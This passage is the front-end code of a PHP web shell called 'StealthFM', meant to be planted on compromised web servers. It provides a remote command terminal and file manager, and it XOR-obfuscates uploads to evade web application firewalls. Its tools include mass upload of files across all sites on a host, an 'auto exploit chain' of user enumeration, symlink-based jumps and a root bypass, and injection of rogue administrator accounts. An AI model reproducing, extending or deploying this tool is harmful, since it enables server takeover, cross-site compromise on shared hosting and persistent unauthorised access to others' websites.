            .table th:last-child, .table td:last-child { width: 90px; text-align: right; padding-right: 10px !important; white-space: nowrap; }
        }
    </style>
</head>
<body>

<nav class="navbar fixed-top">
    <div class="container-fluid flex-nowrap gap-3">
        <a class="navbar-brand d-flex align-items-center me-0" href="#">
            <i class="fas fa-ghost me-2 text-white"></i>
            <span class="text-white">Stealth<span class="text-primary">FM</span></span>
        </a>
        <div class="d-flex gap-2">
            <button class="btn btn-modern" onclick="goHome()" title="Home"><i class="fas fa-home"></i></button>
            <button class="btn btn-modern" onclick="showNewFileModal()" title="New File" style="color:#fff"><i class="fas fa-file-circle-plus"></i></button>
            <button class="btn btn-modern" onclick="toggleTerm()" style="color:var(--accent-success)"><i class="fas fa-terminal"></i></button>
            <button class="btn btn-modern" onclick="openTools()" style="color:var(--accent-warning)"><i class="fas fa-skull"></i></button>
        </div>
    </div>
</nav>

<div id="toast-container"></div>

<div class="container-fluid path-wrapper">
    <div class="sys-info-box">
        <div class="sys-row" style="color:#eee; font-weight:bold; margin-bottom:8px;">System Info: <span class="sys-val"><?php echo $sys['os']; ?></span></div>
        <div class="sys-grid">
            <div>User: <span class="text-success fw-bold"><?php echo $sys['user']; ?></span></div>
            <div class="d-mobile-none">Group: <span class="text-secondary"><?php echo $sys['group']; ?></span></div>
            <div>Safe Mode: <?php echo $sys['safe']; ?> <a href="?do_phpinfo=1" target="_blank" class="php-link">[ PHP Info ]</a></div>
            <div>IP: <span class="text-info"><?php echo $sys['ip']; ?></span></div>
            <div>Software: <span class="text-secondary"><?php echo $sys['soft']; ?></span></div>
            <div>PHP Ver: <span class="text-success"><?php echo $sys['php']; ?></span></div>
            <div class="d-mobile-none">cURL: <span class="text-secondary"><?php echo $sys['curl']; ?></span></div>
            <div class="d-mobile-none">Time: <span class="text-warning"><?php echo $sys['time']; ?></span></div>
        </div>
    </div>

    <div id="terminal-panel" style="display:none;">
        <div class="term-header"><span class="term-title">ROOT@SHELL:~#</span><i class="fas fa-times panel-close" onclick="toggleTerm()"></i></div>
        <div id="term-output" class="term-body-inline"><div style="color:#6a9955;"># Stealth Shell Ready. v65</div></div>
        <div class="term-input-row"><span class="term-prompt">&#10140;</span><input type="text" id="term-cmd-inline" placeholder="Type command..." autocomplete="off"></div>
    </div>
    <div id="process-panel" style="display:none;">
        <div class="console-header"><span class="console-title"><i class="fas fa-cog fa-spin me-2"></i> SYSTEM OUTPUT</span><i class="fas fa-times panel-close" onclick="closeLog()"></i></div>
        <div id="global-log" class="p-2 bg-black text-secondary" style="height:180px; overflow-y:auto; font-family:'JetBrains Mono'; font-size:0.75rem;"></div>
    </div>
    
    <div class="path-bar-custom" id="path-bar-el">
        <button class="btn-icon-path me-2" onclick="loadDir('..')" title="Up Level"><i class="fas fa-level-up-alt"></i></button>
        <i class="fas fa-folder text-secondary me-3"></i>
        <div id="path-txt" title="Current Path">/</div>
    </div>
</div>

<div class="container-fluid">
    <div class="card">
        <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3 desktop-toolbar d-flex justify-content-between align-items-center">
            <div class="fw-bold text-white align-items-center d-none d-md-flex"><i class="fas fa-list me-2 text-primary"></i> File Manager</div>
            <div class="input-group input-group-sm upload-group" style="max-width: 400px;">
                <input type="file" id="uploadInput" class="form-control">
                <button class="btn btn-upload-modern" onclick="uploadFile()" id="btnUpload"><i class="fas fa-cloud-upload-alt me-1"></i> Upload</button>
            </div>
        </div>
        <div class="table-responsive">
            <table class="table table-hover align-middle">
                <thead><tr><th class="ps-2">Name</th><th class="d-mobile-none">Size</th><th class="text-center">Perms</th><th class="d-mobile-none">Modified</th><th class="text-end pe-4">Actions</th></tr></thead>
                <tbody id="fileList"></tbody>
            </table>
        </div>
    </div>
</div>

<div class="modal fade" id="newFileModal" tabindex="-1"><div class="modal-dialog modal-dialog-centered"><div class="modal-content"><div class="modal-header"><h6 class="modal-title text-white">Create New File</h6><button class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><input type="text" id="new-filename" class="form-control bg-dark text-light border-secondary mb-3" placeholder="filename.php"><textarea id="new-content" class="form-control bg-dark text-light border-secondary" rows="5" placeholder="File content..."></textarea></div><div class="modal-footer"><button class="btn btn-modern" data-bs-dismiss="modal">Cancel</button><button class="btn btn-upload-modern" onclick="submitNewFile()">Create</button></div></div></div></div>
<div class="modal fade" id="renameModal" tabindex="-1"><div class="modal-dialog modal-dialog-centered"><div class="modal-content"><div class="modal-header"><h6 class="modal-title text-white">Rename Item</h6><button class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><input type="text" id="rename-input" class="form-control bg-dark text-light border-secondary"></div><div class="modal-footer"><button class="btn btn-modern" data-bs-dismiss="modal">Cancel</button><button class="btn btn-upload-modern" onclick="submitRename()">Save</button></div></div></div></div>
<div class="modal fade" id="editModal" tabindex="-1" data-bs-backdrop="static"><div class="modal-dialog modal-xl modal-dialog-centered modal-dialog-scrollable"><div class="modal-content"><div class="modal-header"><h6 class="modal-title" id="editFileName"><i class="fas fa-code me-2 text-primary"></i>Editor</h6><div class="d-flex gap-2 ms-auto"><button class="btn btn-sm btn-modern" data-bs-dismiss="modal">Cancel</button><button class="btn btn-sm btn-upload-modern px-3" onclick="saveFile()" id="btnSave">Save</button></div></div><div class="modal-body p-0"><div id="editor-container"></div></div></div></div></div>

<div class="modal fade" id="toolsModal" tabindex="-1">
    <div class="modal-dialog modal-lg modal-dialog-centered">
        <div class="modal-content">
            <div class="modal-header"><h6 class="modal-title" style="color:var(--accent-warning)"><i class="fas fa-skull me-2"></i><span id="tool-title">Toolkit</span></h6><button class="btn-close btn-close-white" data-bs-dismiss="modal"></button></div>
            <div class="modal-body p-4">
                <div class="alert alert-dark border border-secondary mb-4 py-2 px-3 small d-flex align-items-center" style="background:#000;color:#aaa"><i class="fas fa-info-circle me-2"></i> Running in: <b class="ms-2 text-white"><span id="tool-path-disp">/</span></b></div>
                <div class="tools-list">
                    <div class="tool-cmd" onclick="startAutoChain()"><div class="cmd-left"><i class="fas fa-radiation fa-spin cmd-icon text-danger"></i><span class="cmd-text text-danger">AUTO EXPLOIT CHAIN</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                    
                    <div class="tool-cmd" onclick="runTool('backup')"><div class="cmd-left"><i class="fas fa-shield-alt cmd-icon c-gold"></i><span class="cmd-text">BACKUP</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>

                    <div class="tool-cmd" onclick="showMassUpload()"><div class="cmd-left"><i class="fas fa-rocket cmd-icon c-purple"></i><span class="cmd-text">SMART MASS UPLOAD</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>

                    <div class="tool-cmd" onclick="openScanSite()"><div class="cmd-left"><i class="fas fa-satellite-dish cmd-icon c-cyan"></i><span class="cmd-text">SCAN SITE</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                
                    <div class="tool-cmd" onclick="openAddAdminUI()"><div class="cmd-left"><i class="fas fa-user-shield cmd-icon c-lime"></i><span class="cmd-text">AUTO ADD ADMIN GUI</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>

                    <div class="tool-cmd" onclick="runTool('ghost_injector')"><div class="cmd-left"><i class="fas fa-ghost cmd-icon text-white"></i><span class="cmd-text">GHOST PROTOCOL (Injector)</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="modal fade" id="massUploadModal" tabindex="-1"><div class="modal-dialog modal-dialog-centered"><div class="modal-content"><div class="modal-header"><h6 class="modal-title text-white">Smart Mass Upload</h6><button class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body">
    <div class="mb-3"><label class="small text-secondary">Target Filename</label><input type="text" id="mass-name" class="form-control bg-dark text-light border-secondary" placeholder="example: index.php"></div>
    <div class="mb-3"><label class="small text-secondary">File Content</label><textarea id="mass-content" class="form-control bg-dark text-light border-secondary" rows="4"></textarea></div>
    <div class="d-flex align-items-center gap-2"><div class="flex-grow-1 border-top border-secondary"></div><span class="small text-secondary">OR UPLOAD</span><div class="flex-grow-1 border-top border-secondary"></div></div>
    <div class="mt-3"><input type="file" id="mass-file-in" class="form-control bg-dark border-secondary text-secondary"></div>
    <div class="mt-3 small text-secondary">
        <i class="fas fa-info-circle"></i> <b>Smart Mode:</b> Uploads to immediate subfolders + public_html only. Fast & Safe.
    </div>
</div><div class="modal-footer"><button class="btn btn-upload-modern w-100" onclick="startMassUpload()">START BACKGROUND TASK</button></div></div></div></div>

<div id="async-widget">
    <div class="aw-header"><span id="aw-title">MASS UPLOAD</span><i class="fas fa-compress cursor-pointer" onclick="toggleWidget()"></i></div>
    <div class="aw-body" id="aw-content">
        <div class="progress-bar-bg"><div class="progress-bar-fill" id="aw-prog"></div></div>
        <div class="aw-stat"><span>Processed: <b id="aw-done" class="text-white">0</b></span><span>Total: <b id="aw-total">0</b></span></div>
        <div class="mt-2 text-center"><small class="text-secondary" id="aw-status">Initializing...</small></div>
    </div>
</div>

<div class="modal fade" id="scanResultModal" tabindex="-1">
    <div class="modal-dialog modal-dialog-centered modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h6 class="modal-title text-white"><i class="fas fa-satellite-dish me-2 text-info"></i> Scan Results</h6>
                <button class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body p-0">
                <div class="p-3 bg-dark border-bottom border-secondary d-flex justify-content-between align-items-center">
                    <span class="text-secondary small">Found: <b class="text-white" id="scan-count">0</b> domains</span>
                    <button class="btn btn-sm btn-outline-light" onclick="copyScanList()"><i class="fas fa-copy"></i> Copy List</button>
                </div>
                <div id="scan-result-body" class="p-3" style="max-height: 60vh; overflow-y: auto;">
                    </div>
            </div>
        </div>
    </div>

<div class="modal fade" id="addAdminModal" tabindex="-1">
    <div class="modal-dialog modal-dialog-centered modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h6 class="modal-title text-white"><i class="fas fa-user-shield me-2 text-warning"></i> Auto Add Admin</h6>
                <button class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body p-4">
                <div class="row g-3 align-items-center mb-4">
                    <div class="col-auto">
                        <label class="col-form-label text-secondary">Target Folder:</label>
                    </div>
                    <div class="col">
                        <select id="admin-target-select" class="form-select form-select-sm bg-dark text-light border-secondary">
                            <option value="jumping">Jumping (Config Grabbed)</option>
                            <option value="symlink">Symlink (3x_sym)</option>
                        </select>
                    </div>
                    <div class="col-auto">
                        <button class="btn btn-sm btn-upload-modern px-4" onclick="startAddAdminTask()">
                            <i class="fas fa-play me-1"></i> START INJECTION
                        </button>
                    </div>
                </div>

                <div class="progress-bar-bg mb-2" style="height:4px;"><div class="progress-bar-fill" id="admin-prog" style="width:0%"></div></div>
                <div class="d-flex justify-content-between small text-secondary mb-3">
                    <span id="admin-status-txt">Ready to inject.</span>
                    <span>Processed: <b class="text-white" id="admin-processed">0</b> / <span id="admin-total">0</span></span>
                </div>

                <div id="admin-result-body" class="p-3 bg-dark border border-secondary rounded" style="max-height: 50vh; overflow-y: auto; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem;">
                    <div class="text-center text-secondary py-5 opacity-50">
                        <i class="fas fa-robot fa-3x mb-3"></i><br>Results will appear here...
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="cyber-footer">
    <span>made with <i class="fas fa-heart"></i> <span class="cy-brand">Sultan</span></span>
    <span>STATUS: <span style="color:#81c995">ACTIVE</span></span>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
    let currentPath = '', currentFile = '', renameTarget = '';
    var editor = null; 
    const editModal = new bootstrap.Modal(document.getElementById('editModal')), 
          toolsModal = new bootstrap.Modal(document.getElementById('toolsModal')),
          massUploadModal = new bootstrap.Modal(document.getElementById('massUploadModal')),
          newFileModal = new bootstrap.Modal(document.getElementById('newFileModal')),
          renameModal = new bootstrap.Modal(document.getElementById('renameModal')),
          scanResultModal = new bootstrap.Modal(document.getElementById('scanResultModal')); // NEW MODAL INSTANCE
    
    function updatePanelStyles() {
        const term = document.getElementById('terminal-panel').style.display !== 'none';
        const log = document.getElementById('process-panel').style.display !== 'none';
        const bar = document.getElementById('path-bar-el');
        if(term || log) bar.classList.add('has-panel-above'); else bar.classList.remove('has-panel-above');
    }
    function showLog() { toolsModal.hide(); document.getElementById('process-panel').style.display = 'block'; updatePanelStyles(); }
    function closeLog() { document.getElementById('process-panel').style.display = 'none'; document.getElementById('global-log').innerHTML = ''; updatePanelStyles(); }
    function toggleTerm() { const p = document.getElementById('terminal-panel'); p.style.display = (p.style.display === 'none') ? 'block' : 'none'; updatePanelStyles(); if(p.style.display === 'block') setTimeout(() => document.getElementById('term-cmd-inline').focus(), 50); }

    function showToast(msg, type = 'success') {
        const container = document.getElementById('toast-container');
        const div = document.createElement('div');
        div.className = `toast-msg ${type}`;
        div.innerHTML = (type === 'success' ? '<i class="fas fa-check-circle me-2 text-success"></i>' : '<i class="fas fa-times-circle me-2 text-danger"></i>') + msg;
        container.appendChild(div);
        setTimeout(() => { div.classList.add('hiding'); setTimeout(() => div.remove(), 300); }, 3000);
    }

    async function api(action, path, method='GET', extraHeaders={}, body=null, signal=null) {
        let headers = { 'X-Action': action, 'X-Path': btoa(path), ...extraHeaders };
        return fetch(window.location.href, { method, headers, body, signal });
    }
    
    function goHome() { currentPath = '__HOME__'; loadDir('__HOME__'); }

    function getFileIcon(name) {
        let ext = name.split('.').pop().toLowerCase();
        if(ext === name) return '<i class="fas fa-file icon-file i-def"></i>';
        switch(ext) {
            case 'php': return '<i class="fab fa-php icon-file i-php"></i>';
            case 'html': case 'htm': return '<i class="fab fa-html5 icon-file i-html"></i>';
            case 'css': return '<i class="fab fa-css3-alt icon-file i-css"></i>';
            case 'js': case 'json': return '<i class="fab fa-js icon-file i-js"></i>';
            case 'zip': case 'rar': case 'tar': case 'gz': case '7z': return '<i class="fas fa-file-archive icon-file i-zip"></i>';
            case 'jpg': case 'jpeg': case 'png': case 'gif': case 'svg': case 'ico': return '<i class="fas fa-file-image icon-file i-img"></i>';
            case 'txt': case 'log': case 'ini': case 'conf': case 'htaccess': return '<i class="fas fa-file-alt icon-file i-code"></i>';
            default: return '<i class="fas fa-file icon-file i-def"></i>';
        }
    }

    function loadDir(path) {
        let target = currentPath;
        if (path === '__HOME__') target = '__HOME__';
        else if (path === '..') {
            if (target && target !== '/' && target.includes('/')) { target = target.substring(0, target.lastIndexOf('/')); if(target === '') target = '/'; } else { target = '/'; }
        } else if (path !== '') { target = (target === '/') ? '/' + path : target + '/' + path; }
        if(path === '' && !currentPath) target = ''; 

        api('list', target).then(r => r.json()).then(res => {
            currentPath = res.path; 
            document.getElementById('path-txt').innerText = res.path; 
            document.getElementById('tool-path-disp').innerText = res.path;
            
            const tbody = document.getElementById('fileList'); tbody.innerHTML = '';
            if (!res.items.length) { tbody.innerHTML = '<tr><td colspan="5" class="text-center py-5 text-secondary fst-italic">Empty Directory</td></tr>'; return; }
            res.items.forEach(f => {
                let isDir = f.type === 'dir'; 
                let icon = isDir ? '<i class="fas fa-folder icon-dir"></i>' : getFileIcon(f.name);
                let click = isDir ? `loadDir('${f.name}')` : `openEditor('${f.name}')`; 
                let pClass = f.write ? 'writable' : 'readonly';
                let textClass = isDir ? 'text-folder' : 'text-file';
                tbody.innerHTML += `<tr><td class="ps-2"><a onclick="${click}" class="${textClass} cursor-pointer d-flex align-items-center">${icon} ${f.name}</a></td><td class="d-mobile-none text-secondary"><small>${f.size}</small></td><td class="text-center"><span onclick="chmodItem('${f.name}', '${f.perm}')" class="badge-perm ${pClass} cursor-pointer">${f.perm}</span></td><td class="d-mobile-none text-secondary"><small>${f.date}</small></td><td class="text-end pe-4"><button class="action-btn edit me-1" onclick="openRename('${f.name}')" title="Rename"><i class="fas fa-pen"></i></button><button class="action-btn del" onclick="deleteItem('${f.name}')" title="Delete"><i class="fas fa-trash"></i></button></td></tr>`;
            });
        }).catch(() => showToast('Network Error', 'error'));
    }
    
    function openEditor(name) { 
        currentFile = (currentPath === '/') ? '/' + name : currentPath + '/' + name; 
        api('read', currentFile).then(r => r.text()).then(txt => { 
            document.getElementById('editFileName').innerHTML = `<i class="fas fa-code me-2 text-primary"></i> ${name}`;
            if(!editor) {
                editor = ace.edit("editor-container");
                editor.setTheme("ace/theme/monokai"); 
                editor.session.setMode("ace/mode/php"); 
                editor.setShowPrintMargin(false);
                editor.setFontSize(14);
                editor.setOptions({ fontFamily: "JetBrains Mono" });
            }
            let ext = name.split('.').pop().toLowerCase();
            if(ext === 'html') editor.session.setMode("ace/mode/html");
            else if(ext === 'css') editor.session.setMode("ace/mode/css");
            else if(ext === 'js') editor.session.setMode("ace/mode/javascript");
            else editor.session.setMode("ace/mode/php");
            editor.setValue(txt, -1); editModal.show(); 
        }); 
    }

    // --- WAF BYPASS ENGINE ---
    function wafBypass(b64Data) {
        const key = "Sultan"; // Harus sama dengan kunci di PHP
        let out = "";
        for (let i = 0; i < b64Data.length; i++) {
            out += String.fromCharCode(b64Data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
        }
        return btoa(out); // Encode kembali agar aman transit via HTTP
    }

    // --- OVERRIDE SAVE FILE ---
    function saveFile() { 
        let content = editor.getValue(); 
        let encodedBase64 = btoa(unescape(encodeURIComponent(content))); 
        let securePayload = wafBypass(encodedBase64); // Obfuscate payload
        
        // Kirim menggunakan header waf_bypass
        api('save', currentFile, 'PUT', {'X-Encode': 'waf_bypass'}, securePayload).then(r => r.text()).then(m => { 
            showToast(m); 
            editModal.hide(); 
            loadDir(''); 
        });
    }
    
    function showNewFileModal() {
        document.getElementById('new-filename').value = '';
        document.getElementById('new-content').value = '';
        newFileModal.show();
    }

    function submitNewFile() {
        let name = document.getElementById('new-filename').value;
        let content = document.getElementById('new-content').value;
        if (name) {
            let path = (currentPath === '/') ? '/' + name : currentPath + '/' + name;
            let encoded = btoa(unescape(encodeURIComponent(content))); 
            api('save', path, 'PUT', {'X-Encode': 'b64'}, encoded).then(r => r.text()).then(m => { 
                showToast("Created: " + name); 
                newFileModal.hide();
                loadDir(''); // AUTO REFRESH
            });
        }
    }

    // --- OVERRIDE UPLOAD FILE ---
    function uploadFile() { 
        let input=document.getElementById('uploadInput'); 
        if(!input.files.length) { showToast("Select a file first", "error"); return; }
        
        let btn=document.getElementById('btnUpload'); 
        let old=btn.innerHTML; 
        btn.innerHTML='<i class="fas fa-spinner fa-spin"></i>'; 
        
        let file = input.files[0];
        let path=currentPath ? currentPath + '/' + file.name : file.name; 
        if(currentPath === '/') path = '/' + file.name; 
        
        let reader = new FileReader();
        reader.onload = function(e) {
            let base64Content = e.target.result.split(',')[1];
            let securePayload = wafBypass(base64Content); // Obfuscate file
            
            // Kirim menggunakan header waf_bypass
            api('upload', path, 'PUT', {'X-Encode': 'waf_bypass'}, securePayload)
                .then(r => r.text())
                .then(m => { 
                    showToast(m); 
                    input.value=''; 
                    btn.innerHTML=old; 
                    loadDir(''); 
                })
                .catch(() => { showToast("Upload Failed", "error"); btn.innerHTML=old; });
        };
        reader.readAsDataURL(file);
    }

    function deleteItem(name) { 
        if(confirm(`Del ${name}?`)) { 
            let path = (currentPath === '/') ? '/' + name : currentPath + '/' + name; 
            api('delete', path, 'DELETE').then(() => { 
                showToast("Deleted: " + name); 
                loadDir(''); // AUTO REFRESH
            }); 
        } 
    }
    
    function openRename(name) {
        renameTarget = name;
        document.getElementById('rename-input').value = name;
        renameModal.show();
    }

    function submitRename() {
        let newName = document.getElementById('rename-input').value;
        if (newName && newName !== renameTarget) {
            let path = (currentPath === '/') ? '/' + renameTarget : currentPath + '/' + renameTarget; 
            api('rename', path, 'GET', {'X-Data': btoa(newName)}).then(r => { 
                showToast(r.text()); 
                renameModal.hide();
                loadDir(''); // AUTO REFRESH
            });
        }
    }
    
    function chmodItem(name, p) { 
        let n=prompt("Chmod:", "0"+p); 
        if(n) { 
            let path = (currentPath === '/') ? '/' + name : currentPath + '/' + name; 
            api('chmod', path, 'GET', {'X-Data': n}).then(() => { 
                showToast("Chmod Updated"); 
                loadDir(''); // AUTO REFRESH
            }); 
        } 
    }
    
    function openTools() { toolsModal.show(); }
    
    document.getElementById('term-cmd-inline').addEventListener('keypress', function (e) {
        if (e.key === 'Enter') {
            let cmd = this.value; if(!cmd) return;
            let outDiv = document.getElementById('term-output');
            outDiv.innerHTML += `<div><span style="color:#c586c0;">&#10140;</span> <span style="color:#d4d4d4;">${cmd}</span></div>`;
            this.value = ''; outDiv.scrollTop = outDiv.scrollHeight;
            
            api('cmd', currentPath, 'GET', { 'X-Cmd': btoa(cmd) }).then(r => r.text()).then(res => { 
                outDiv.innerHTML += `<div style="color:#9cdcfe; margin-bottom:10px;">${res}</div>`; 
                outDiv.scrollTop = outDiv.scrollHeight; 
                
                // FITUR BARU: Auto Refresh File Manager setelah command selesai
                loadDir(''); 
            });
        }
    });

    function showMassUpload() { toolsModal.hide(); massUploadModal.show(); }
    
    function startMassUpload() {
        let name = document.getElementById('mass-name').value;
        let content = document.getElementById('mass-content').value;
        let fileIn = document.getElementById('mass-file-in').files[0];
        
        if (!name) { showToast('Filename required!', 'error'); return; }
        
        massUploadModal.hide();
        document.getElementById('async-widget').style.display = 'block';
        updateWidget(0, 0, 'Preparing Payload...');

        if (fileIn) {
            let reader = new FileReader();
            reader.onload = function(e) { initMassTask(name, e.target.result.split(',')[1]); };
            reader.readAsDataURL(fileIn);
        } else {
            initMassTask(name, btoa(unescape(encodeURIComponent(content))));
        }
    }

    function initMassTask(filename, b64content) {
        updateWidget(0, 0, 'Scanning Directories... (Fast)');
        api('tool', currentPath, 'PUT', {'X-Tool':'mass_upload','X-Encode':'b64', 'X-Mass-Mode':'init'}, b64content).then(r => r.json()).then(res => {
            if(res.status === 'ready') {
                showToast(`Scan complete. Found ${res.total} folders.`);
                if(res.total === 0) { updateWidget(0, 0, 'No targets found.'); return; }
                processMassBatch(0, filename, res.total);
            } else {
                showToast('Init Failed', 'error');
                document.getElementById('async-widget').style.display = 'none';
            }
        });
    }

    function processMassBatch(step, filename, total) {
                updateWidget(step, total, `Uploading batch ${step}...`);
        api('tool', currentPath, 'GET', {'X-Tool':'mass_upload', 'X-Step':step, 'X-Data':btoa(filename), 'X-Mass-Mode':'process'}).then(r => r.json()).then(res => {
            if (res.status === 'continue') {
                processMassBatch(res.next_step, filename, total);
            } else {
                updateWidget(total, total, 'DONE!');
                showToast('Mass Upload Completed!', 'success');
                document.getElementById('mass-name').value = '';
                document.getElementById('mass-content').value = '';
                document.getElementById('mass-file-in').value = '';
                setTimeout(() => { document.getElementById('async-widget').style.display = 'none'; }, 5000);
            }
        }).catch(e => {
            updateWidget(step, total, 'Error. Retrying...');
            setTimeout(() => processMassBatch(step, filename, total), 3000);
        });
    }

    function updateWidget(done, total, status) {
        let pct = (total > 0) ? Math.round((done / total) * 100) : 0;
        document.getElementById('aw-prog').style.width = pct + '%';
        document.getElementById('aw-done').innerText = done;
        document.getElementById('aw-total').innerText = total;
        document.getElementById('aw-status').innerText = status;
    }

    function toggleWidget() { let b = document.getElementById('aw-content'); b.style.display = (b.style.display === 'none') ? 'block' : 'none'; }
    
    function runTool(toolName) { showLog(); let log = document.getElementById('global-log'); log.innerHTML += `<div class="text-primary mb-2"><i class="fas fa-cog fa-spin me-2"></i>Running ${toolName}...</div>`; api('tool', currentPath, 'GET', {'X-Tool': toolName}).then(r => r.text()).then(res => { log.innerHTML += res; log.innerHTML += `<div class="text-success mt-2"><i class="fas fa-check me-2"></i>Done.</div><hr class="border-secondary">`; log.scrollTop = log.scrollHeight; }).catch(e => { log.innerHTML += `<div class="text-danger">Error: ${e}</div>`; }); }
    
    // --- FITUR BARU: SCAN SITE GUI (V52: ICON CLICK EFFECT) ---
    let currentScanData = [];
    const googleSvg = '<svg width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>';

    function openScanSite() {
        toolsModal.hide();
        const toast = document.createElement('div');
        toast.className = 'toast-msg';
        toast.innerHTML = '<i class="fas fa-satellite-dish fa-spin me-2 text-warning"></i> Scanning directories...';
        document.getElementById('toast-container').appendChild(toast);
        
        api('tool', currentPath, 'GET', {'X-Tool': 'scan_site'}).then(r => r.json()).then(res => {
            toast.remove();
            
            if (res.status === 'success') {
                currentScanData = res.data;
                document.getElementById('scan-count').innerText = res.count;
                
                let html = '';
                if (res.count > 0) {
                    html = '<div class="list-group list-group-flush">';
                    res.data.forEach(domain => {
                       html += `<div class="list-group-item bg-transparent border-bottom border-secondary text-light d-flex justify-content-between align-items-center py-2 px-0">
                            <span class="font-monospace text-truncate me-2"><i class="fas fa-globe text-secondary me-2 small"></i>${domain}</span>
                            <a href="https://www.google.com/search?q=site:${domain}" target="_blank" class="btn btn-sm btn-dark border-secondary text-secondary" title="Check Index" onclick="markAsChecked(this)">${googleSvg}</a>
                       </div>`; 
                    });
                    html += '</div>';
                } else {
                    html = '<div class="text-center py-5 text-secondary"><i class="fas fa-search fa-3x mb-3 opacity-25"></i><br>No domains found here.</div>';
                }
                
                document.getElementById('scan-result-body').innerHTML = html;
                scanResultModal.show();
            } else {
                showToast('Scan Failed', 'error');
            }
        });
    }

    function markAsChecked(el) {
        // Find the parent row
        let row = el.closest('.list-group-item');
        // Find the globe icon inside that row
        let icon = row.querySelector('.fa-globe');
        // Turn it green
        if(icon) {
            icon.classList.remove('text-secondary');
            icon.classList.add('text-success');
        }
    }

    function copyScanList() {
        if(currentScanData.length === 0) return;
        const text = currentScanData.join('\n');
        navigator.clipboard.writeText(text).then(() => {
            showToast('List Copied to Clipboard!');
        });
    }

    function runWatchdogTool(toolName, step, mode = 'jumping') {
        let log = document.getElementById('global-log'); 
        if(step === 0) { 
            showLog();
            if (!log.innerHTML.includes("STARTING AUTOMATED CHAIN")) {
                log.innerHTML = `<div class="text-warning mb-2"><i class="fas fa-running me-2"></i>Starting ${toolName} (${mode.toUpperCase()})...</div><hr class="border-secondary">`; 
            } else {
                 log.innerHTML += `<div class="text-warning mb-2"><i class="fas fa-running me-2"></i>Starting ${toolName} (${mode.toUpperCase()})...</div>`;
            }
        }
        
        const controller = new AbortController(); 
        const timeoutId = setTimeout(() => { 
            controller.abort(); 
            log.innerHTML += `<div class="text-warning">[!] Watchdog: Batch Timeout (20s) at #${step}. Skipping 5...</div>`; 
            log.scrollTop = log.scrollHeight; 
            runWatchdogTool(toolName, step+5, mode); 
        }, 20000);

        api('tool', currentPath, 'GET', {'X-Tool': toolName, 'X-Step': step, 'X-Mode': mode}, null, controller.signal)
        .then(r => r.json())
        .then(res => { 
            clearTimeout(timeoutId); 
            if(res.html) log.innerHTML += res.html; 
            if(res.status === 'continue') { 
                log.scrollTop = log.scrollHeight; 
                setTimeout(() => runWatchdogTool(toolName, res.next_step, mode), 10); 
            } else { 
                log.innerHTML += `<hr class="border-secondary"><div class="text-success fw-bold"><i class="fas fa-flag-checkered me-2"></i>JOB FINISHED. Scanned ${res.total} files.</div>`; 
                log.scrollTop = log.scrollHeight; 
            } 
        }).catch(err => { 
            if(err.name === 'AbortError') return; 
            log.innerHTML += `<div class="text-danger">[!] Net Err at #${step}. Skipping batch...</div>`; 
            runWatchdogTool(toolName, step+5, mode); 
        });
    }

    async function startAutoChain() {
        toolsModal.hide();
        showLog();
        let log = document.getElementById('global-log');
        
        const logMsg = (msg, color='text-info') => {
            log.innerHTML += `<div class="${color} mb-1">[CHAIN] ${msg}</div>`;
            log.scrollTop = log.scrollHeight;
        };

        log.innerHTML = `<div class="text-danger fw-bold mb-3">--- STARTING AUTOMATED CHAIN ---</div>`;

        try {
            // 1. USER ENUM
            logMsg("1. Running User Enum...", "text-warning");
            await api('tool', currentPath, 'GET', {'X-Tool': 'bypass_user'});
            logMsg("User Enum DONE. (passwd.txt saved)", "text-success");
            log.innerHTML += "<hr class='border-secondary'>";

            // 2. JUMPER
            logMsg("2. Running Jumper Cage...", "text-warning");
            await api('tool', currentPath, 'GET', {'X-Tool': 'jumper_cage'});
            logMsg("Jumper DONE.", "text-success");
            log.innerHTML += "<hr class='border-secondary'>";

            // 3. SYMLINKER
            logMsg("3. Running Symlinker...", "text-warning");
            await api('tool', currentPath, 'GET', {'X-Tool': 'symlink_cage'});
            logMsg("Symlinker DONE.", "text-success");
            log.innerHTML += "<hr class='border-secondary'>";

            // 4. ROOT BYPASS
            logMsg("4. Running Root Symlink Bypass...", "text-warning");
            await api('tool', currentPath, 'GET', {'X-Tool': 'root_bypass'});
            logMsg("Root Bypass Executed. (Check folder 'symlinkbypass')", "text-success");
            log.innerHTML += "<hr class='border-secondary'>";

            logMsg("Auto Chain Done. Use Toolkit for Add Admin.", "text-success");

        } catch (e) {
